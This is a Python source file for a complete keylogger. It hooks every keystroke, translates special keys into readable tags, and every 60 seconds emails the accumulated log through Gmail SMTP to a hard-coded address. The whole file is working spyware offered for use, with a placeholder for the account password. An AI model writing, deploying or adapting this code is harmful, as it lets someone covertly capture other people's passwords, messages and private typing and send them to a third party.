import smtplib # For sending email using SMTP protocol (Gmail)
from email.mime.multipart import MIMEMultipart # Email formatting
from email.mime.text import MIMEText
import keyboard # Capture keystrokes
from threading import Timer # For sending keylog report once every [] seconds
from datetime import datetime

SMTP_ADDRESS = "inquire.blairandrews@gmail.com"
SMTP_PASSWORD = "INSERT PASSWORD HERE" # Gmail program authentication password
REPORT_INTERVAL = 60 # Sends report every <> second(s)
VERBOSITY = 1 # Set to 0 (False) or 1 (True)

class Keylogger:
    def __init__(self, interval, report_method):
        # Pass SEND_REPORT_EVERY local variable to interval variable
        self.interval = interval
        self.report_method = report_method

        # String that contains every keystoke to put into the log
        self.log = ""

        # Record start and ending datetimes
        self.start_datetime = datetime.now()
        self.end_datetime = datetime.now()

    def keystroke_translator(self, keystroke):
        # This function is called whenever a keystroke is detected
        name = keystroke.name
        if len(name) > 1: # If the keystroke isn't a simple character (i.e SPACE, ENTER, decimal point, etc.)
            # uppercase with []
            if name == "space":
                # Record " " instead of "space"
                name = " "
            elif name == "enter":
                # Adds a new line in the logs whenever ENTER is detected
                name = "[ENTER]\n"
            elif name == "decimal":
                # Add a decimal point instead of "decimal"
                name = "."
            else:
                # If the character is something unknown, replace with a question mark
                name = name.replace(" ", "?")

                # Make shift, tab, ctrl keystrokes record as [SHIFT], [TAB], [CTRL] for aesthetic
                name = f"[{name.upper()}]"

        # Add keystroke to log
        self.log += name

    def email_prep(self, message):
        # Function that essentially turns the keylogs into readable HTML/plaintext to send in an emai
        # Header
        rawLogs = MIMEMultipart("alternative")
        rawLogs["From"] = SMTP_ADDRESS
        rawLogs["To"] = SMTP_ADDRESS
        rawLogs["Subject"] = "Keylogs captured"

        # Email body
        html = f"<p>{message}</p>"
        plaintext = MIMEText(message, "plain")
        html = MIMEText(html, "html")
        rawLogs.attach(plaintext)
        rawLogs.attach(html)

        # Convert to String so we can send using the SMTP function
        return rawLogs.as_string()

    def email_send(self, email, password, logs):
        # Make a connection to an SMTP server - Gmail
        smtpServer = smtplib.SMTP(host="smtp.gmail.com", port=587)

        # Connect to the SMTP server in TLS mode
        smtpServer.starttls()
        
        # Login to the email account
        smtpServer.login(email, password)

        # Send the message
        smtpServer.sendmail(email, email, self.email_prep(logs))

        # Terminates session
        smtpServer.quit()
        if VERBOSITY:
            print(f"{datetime.now()} - Sent an email to {email} containing: {logs}")

    def report(self):
        # Function that gets called every interval, and sends keylogs to smtp email, and resets log
        if self.log:
            # If the log isn't empty, continue reporting log
            self.end_datetime = datetime.now()

            if self.report_method == "email":
                self.email_send(SMTP_ADDRESS, SMTP_PASSWORD, self.log)
            else:
                print("Invalid reporting method! Try using 'email'.")

        self.log = "" # Reset logs
        timer = Timer(interval=self.interval, function=self.report) # Start a new timer

        # Set current thread as daemon (which means it dies when the main thread (keylogger) dies)
        timer.daemon = True

        # Start the timer
        timer.start()

    def start(self):
        # Reset current start datetime of keylogs to now
        self.start_datetime = datetime.now()

        # Start the keylogger
        keyboard.on_release(callback=self.keystroke_translator)

        # Start reporting the keylogs
        self.report()

        if VERBOSITY:
            print(f"{datetime.now()} - Started keylogger.")
        
        # Block the current thread to initialise a new one
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=REPORT_INTERVAL, report_method="email")
    keylogger.start()